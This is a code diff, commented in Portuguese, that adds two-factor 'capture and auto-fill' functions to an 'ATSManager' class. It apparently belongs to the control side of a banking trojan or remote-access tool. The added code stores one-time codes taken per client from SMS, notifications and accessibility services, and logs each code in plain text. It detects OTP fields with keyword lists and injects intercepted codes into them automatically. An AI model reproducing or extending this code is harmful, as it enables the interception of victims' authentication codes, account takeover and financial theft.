@@ -320,6 +320,313 @@ class ATSManager {
     getClientDatabase(clientID) {
         return new (require('./databaseGateway')).clientdb(clientID);
     }
+
+    // ============================================
+    // 2FA / OTP ENHANCEMENTS (Auto-Preenchimento + Captura de 2FA)
+    // ============================================
+
+    /**
+     * Habilita/desabilita captura e auto-preenchimento de 2FA/OTP
+     */
+    setTwoFactorEnabled(clientID, enabled, callback) {
+        try {
+            let clientDB = this.getClientDatabase(clientID);
+            let atsConfig = clientDB.get('atsConfig').value() || {};
+
+            if (!atsConfig.twoFactorConfig) {
+                atsConfig.twoFactorConfig = this.getDefaultTwoFactorConfig();
+            }
+
+            atsConfig.twoFactorConfig.enabled = !!enabled;
+            clientDB.get('atsConfig').assign(atsConfig).write();
+
+            global.logManager.log(CONST.logTypes.info,
+                `ATS 2FA ${enabled ? 'Habilitado' : 'Desabilitado'} para ${clientID}`);
+
+            callback(false);
+        } catch (error) {
+            callback(error.message);
+        }
+    }
+
+    /**
+     * Ativa/desativa a injeção automática de OTP quando o campo é detectado
+     */
+    setAutoInjectOTP(clientID, enabled, callback) {
+        try {
+            let clientDB = this.getClientDatabase(clientID);
+            let atsConfig = clientDB.get('atsConfig').value() || {};
+
+            if (!atsConfig.twoFactorConfig) {
+                atsConfig.twoFactorConfig = this.getDefaultTwoFactorConfig();
+            }
+
+            atsConfig.twoFactorConfig.autoInjectOTP = !!enabled;
+            clientDB.get('atsConfig').assign(atsConfig).write();
+
+            global.logManager.log(CONST.logTypes.success,
+                `ATS AutoInject OTP ${enabled ? 'ativado' : 'desativado'} para ${clientID}`);
+
+            callback(false);
+        } catch (error) {
+            callback(error.message);
+        }
+    }
+
+    /**
+     * Adiciona padrão de campo de 2FA/OTP (ex: "código", "token", "sms")
+     */
+    addOTPFieldPattern(clientID, pattern, callback) {
+        try {
+            let clientDB = this.getClientDatabase(clientID);
+            let atsConfig = clientDB.get('atsConfig').value() || {};
+
+            if (!atsConfig.twoFactorConfig) {
+                atsConfig.twoFactorConfig = this.getDefaultTwoFactorConfig();
+            }
+
+            let patterns = atsConfig.twoFactorConfig.otpFieldPatterns || [];
+            pattern = pattern.toLowerCase().trim();
+
+            if (!patterns.includes(pattern)) {
+                patterns.push(pattern);
+                atsConfig.twoFactorConfig.otpFieldPatterns = patterns;
+                clientDB.get('atsConfig').assign(atsConfig).write();
+            }
+
+            global.logManager.log(CONST.logTypes.success,
+                `ATS Padrão OTP adicionado ${clientID}: ${pattern}`);
+
+            callback(false);
+        } catch (error) {
+            callback(error.message);
+        }
+    }
+
+    removeOTPFieldPattern(clientID, pattern, callback) {
+        try {
+            let clientDB = this.getClientDatabase(clientID);
+            let atsConfig = clientDB.get('atsConfig').value() || {};
+
+            if (atsConfig.twoFactorConfig && atsConfig.twoFactorConfig.otpFieldPatterns) {
+                let patterns = atsConfig.twoFactorConfig.otpFieldPatterns;
+                pattern = pattern.toLowerCase().trim();
+                atsConfig.twoFactorConfig.otpFieldPatterns = patterns.filter(p => p !== pattern);
+                clientDB.get('atsConfig').assign(atsConfig).write();
+            }
+
+            callback(false);
+        } catch (error) {
+            callback(error.message);
+        }
+    }
+
+    /**
+     * Captura um OTP (de SMS, notificação, accessibility ou manual)
+     */
+    captureOTP(clientID, otpCode, source, metadata, callback) {
+        try {
+            let clientDB = this.getClientDatabase(clientID);
+            let atsConfig = clientDB.get('atsConfig').value() || {};
+
+            if (!atsConfig.twoFactorConfig) {
+                atsConfig.twoFactorConfig = this.getDefaultTwoFactorConfig();
+            }
+
+            const otpEntry = {
+                code: otpCode,
+                timestamp: new Date(),
+                source: source || 'unknown', // 'sms', 'notification', 'accessibility', 'webview', 'manual'
+                app: metadata && metadata.app ? metadata.app : 'unknown',
+                fieldContext: metadata && metadata.fieldContext ? metadata.fieldContext : '',
+                expiresAt: new Date(Date.now() + (5 * 60 * 1000)) // 5 minutos
+            };
+
+            if (!atsConfig.twoFactorConfig.capturedOTPs) {
+                atsConfig.twoFactorConfig.capturedOTPs = [];
+            }
+
+            atsConfig.twoFactorConfig.capturedOTPs.unshift(otpEntry);
+
+            if (atsConfig.twoFactorConfig.capturedOTPs.length > 20) {
+                atsConfig.twoFactorConfig.capturedOTPs = atsConfig.twoFactorConfig.capturedOTPs.slice(0, 20);
+            }
+
+            atsConfig.twoFactorConfig.lastOTP = otpEntry;
+            clientDB.get('atsConfig').assign(atsConfig).write();
+
+            global.logManager.log(CONST.logTypes.success,
+                `ATS OTP Capturado ${clientID} [${source}]: ${otpCode}`);
+
+            callback(false, otpEntry);
+        } catch (error) {
+            callback(error.message);
+        }
+    }
+
+    /**
+     * Retorna o último OTP válido (não expirado)
+     */
+    getLatestValidOTP(clientID) {
+        try {
+            let clientDB = this.getClientDatabase(clientID);
+            let atsConfig = clientDB.get('atsConfig').value() || {};
+            let tf = atsConfig.twoFactorConfig || {};
+
+            if (!tf.lastOTP) return null;
+
+            const now = new Date();
+            if (new Date(tf.lastOTP.expiresAt) > now) {
+                return tf.lastOTP;
+            }
+
+            if (tf.capturedOTPs && tf.capturedOTPs.length > 0) {
+                for (let entry of tf.capturedOTPs) {
+                    if (new Date(entry.expiresAt) > now) {
+                        return entry;
+                    }
+                }
+            }
+
+            return null;
+        } catch (error) {
+            return null;
+        }
+    }
+
+    /**
+     * Verifica se o campo atual é um campo de 2FA/OTP
+     */
+    isOTPField(clientID, fieldDescription, fieldViewId, fieldText) {
+        try {
+            let clientDB = this.getClientDatabase(clientID);
+            let atsConfig = clientDB.get('atsConfig').value() || {};
+            let tf = atsConfig.twoFactorConfig || {};
+
+            if (!tf.enabled) {
+                return false;
+            }
+
+            const patterns = (tf.otpFieldPatterns || []).map(p => p.toLowerCase());
+            const combined = `${fieldDescription || ''} ${fieldViewId || ''} ${fieldText || ''}`.toLowerCase();
+
+            for (let pattern of patterns) {
+                if (combined.includes(pattern)) {
+                    return true;
+                }
+            }
+
+            // Heurísticas extras
+            if (/\b(código|codigo|token|otp|sms|verifica|auth|autentica|2fa|one.?time)\b/i.test(combined)) {
+                return true;
+            }
+
+            if (fieldText && /^[0-9\s-]{4,10}$/.test(fieldText.trim())) {
+                return true;
+            }
+
+            return false;
+        } catch (error) {
+            return false;
+        }
+    }
+
+    /**
+     * Retorna o código OTP pronto para injetar (se houver válido)
+     */
+    getOTPToInject(clientID) {
+        const latest = this.getLatestValidOTP(clientID);
+        return latest ? latest.code : null;
+    }
+
+    /**
+     * Registra tentativa de injeção automática de OTP
+     */
+    logOTPInjection(clientID, otpCode, success, fieldInfo, callback) {
+        try {
+            let clientDB = this.getClientDatabase(clientID);
+            let atsConfig = clientDB.get('atsConfig').value() || {};
+
+            if (!atsConfig.twoFactorConfig) {
+                atsConfig.twoFactorConfig = this.getDefaultTwoFactorConfig();
+            }
+
+            if (!atsConfig.twoFactorConfig.otpInjectionLog) {
+                atsConfig.twoFactorConfig.otpInjectionLog = [];
+            }
+
+            atsConfig.twoFactorConfig.otpInjectionLog.unshift({
+                timestamp: new Date(),
+                code: otpCode,
+                success: !!success,
+                field: fieldInfo || {},
+                source: 'auto'
+            });
+
+            if (atsConfig.twoFactorConfig.otpInjectionLog.length > 50) {
+                atsConfig.twoFactorConfig.otpInjectionLog = atsConfig.twoFactorConfig.otpInjectionLog.slice(0, 50);
+            }
+
+            clientDB.get('atsConfig').assign(atsConfig).write();
+
+            global.logManager.log(CONST.logTypes.info,
+                `ATS OTP Injection ${success ? 'sucesso' : 'falha'} ${clientID}: ${otpCode}`);
+
+            callback(false);
+        } catch (error) {
+            callback(error.message);
+        }
+    }
+
+    getCapturedOTPs(clientID, limit = 20, callback) {
+        try {
+            let clientDB = this.getClientDatabase(clientID);
+            let atsConfig = clientDB.get('atsConfig').value() || {};
+            let tf = atsConfig.twoFactorConfig || {};
+
+            callback(false, {
+                lastOTP: tf.lastOTP || null,
+                otps: (tf.capturedOTPs || []).slice(0, limit),
+                autoInjectOTP: tf.autoInjectOTP !== false,
+                enabled: tf.enabled === true
+            });
+        } catch (error) {
+            callback(error.message);
+        }
+    }
+
+    clearCapturedOTPs(clientID, callback) {
+        try {
+            let clientDB = this.getClientDatabase(clientID);
+            let atsConfig = clientDB.get('atsConfig').value() || {};
+
+            if (atsConfig.twoFactorConfig) {
+                atsConfig.twoFactorConfig.capturedOTPs = [];
+                atsConfig.twoFactorConfig.lastOTP = null;
+                clientDB.get('atsConfig').assign(atsConfig).write();
+            }
+
+            callback(false);
+        } catch (error) {
+            callback(error.message);
+        }
+    }
+
+    getDefaultTwoFactorConfig() {
+        return {
+            enabled: false,
+            autoInjectOTP: true,
+            smsMonitoringEnabled: true,
+            otpFieldPatterns: [
+                'código', 'codigo', 'token', 'otp', 'sms', 'verifica',
+                'autentica', 'auth', '2fa', 'one time', 'one-time',
+                'código sms', 'código de verifica', 'senha tempor'
+            ],
+            capturedOTPs: [],
+            lastOTP: null,
+            otpInjectionLog: []
+        };
+    }
 }
 
 module.exports = ATSManager;
